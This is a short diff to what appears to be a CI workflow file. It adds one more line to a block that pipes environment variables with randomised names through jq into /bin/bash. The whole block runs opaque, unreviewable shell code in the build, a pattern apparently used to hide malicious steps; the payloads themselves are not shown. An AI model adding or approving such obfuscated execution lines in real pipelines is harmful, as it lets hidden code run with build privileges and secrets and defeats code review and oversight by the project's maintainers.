@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$wlk275" | jq -r .wjwf9209 | /bin/bash
           echo $nptgc7312 | jq -r .qrnnk301 | /bin/bash
           echo $chvpk5 | jq -r .plwr4161 | /bin/bash
+          printf '%s' "$lqfy9" | jq -r .mt2 | /bin/bash
 
       - name: Persist results
         if: always()
